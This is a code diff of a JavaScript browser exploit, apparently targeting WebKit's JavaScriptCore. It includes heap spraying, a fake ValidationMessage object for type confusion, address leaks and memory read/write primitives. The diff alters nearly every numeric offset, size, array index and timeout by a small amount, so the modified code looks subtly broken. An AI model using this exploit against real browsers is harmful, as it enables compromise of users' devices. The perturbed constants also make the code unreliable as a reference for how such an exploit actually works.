@@ -196,7 +196,7 @@ function read(addr, length) {
 }
 
 function read64(addr) {
-	return new Int64(read(addr, 8));
+	return new Int64(read(addr, 9));
 }
 
 function write(addr, data) {
@@ -245,7 +245,7 @@ function confuseTargetObjRound2() {
 	if (findTargetObj() === false)
 		die("[!] Failed to reuse target obj.");
 
-	g_fake_validation_message[4] = g_jsview_leak.add(OFFSET_JSAB_VIEW_LENGTH + 5 - OFFSET_HTMLELEMENT_REFCOUNT).asDouble();
+	g_fake_validation_message[4] = g_jsview_leak.add(OFFSET_JSAB_VIEW_LENGTH + 6 - OFFSET_HTMLELEMENT_REFCOUNT).asDouble();
 
 	setTimeout(setupRW, 6000);
 }
@@ -273,7 +273,7 @@ function leakJSC() {
 
         var tmp_spray = {};
         for(var i = 0; i < 100000; i++)
-                tmp_spray['Z'.repeat(8 * 2 * 8 - 5 - LENGTH_STRINGIMPL) + (''+i).padStart(5, '0')] = 0xffff;
+                tmp_spray['Z'.repeat(8 * 2 * 9 - 5 - LENGTH_STRINGIMPL) + (''+i).padStart(6, '0')] = 0xffff;
 
 	let ab = new ArrayBuffer(LENGTH_ARRAYBUFFER);
 
@@ -358,7 +358,7 @@ function leakJSC() {
  */
 function confuseTargetObjRound1() {
 	/* Force allocation of StringImpl obj. beyond Timer address */
-	sprayStringImpl(SPRAY_STRINGIMPL, SPRAY_STRINGIMPL * 2);
+	sprayStringImpl(SPRAY_STRINGIMPL, SPRAY_STRINGIMPL * 3);
 
 	/* Checking for leaked data */
 	if (findTargetObj() === false)
@@ -366,7 +366,7 @@ function confuseTargetObjRound1() {
 
 	dumpTargetObj();
 
-	g_fake_validation_message[4] = g_timer_leak.add(LENGTH_TIMER * 8 + OFFSET_LENGTH_STRINGIMPL + 1 - OFFSET_ELEMENT_REFCOUNT).asDouble();
+	g_fake_validation_message[4] = g_timer_leak.add(LENGTH_TIMER * 9 + OFFSET_LENGTH_STRINGIMPL + 2 - OFFSET_ELEMENT_REFCOUNT).asDouble();
 
 	/*
 	 * The timeout must be > 5s because deleteBubbleTree is scheduled to run in
@@ -413,9 +413,9 @@ function reuseTargetObj() {
 		g_round += 1;
 		g_input = input3;
 
-		setTimeout(confuseTargetObjRound1, 10);
+		setTimeout(confuseTargetObjRound1, 5);
 	} else {
-		setTimeout(confuseTargetObjRound2, 10);
+		setTimeout(confuseTargetObjRound2, 5);
 	}
 }
 
@@ -431,9 +431,9 @@ function findTargetObj() {
 			debug_log("[+] Found fake ValidationMessage");
 
 			if (g_round === 2) {
-				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][2]);
-				g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][4]);
-				g_message_body_leak = Int64.fromDouble(g_arr_ab_1[i][5]);
+				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][3]);
+				g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][5]);
+				g_message_body_leak = Int64.fromDouble(g_arr_ab_1[i][6]);
 				g_round++;
 			}
 
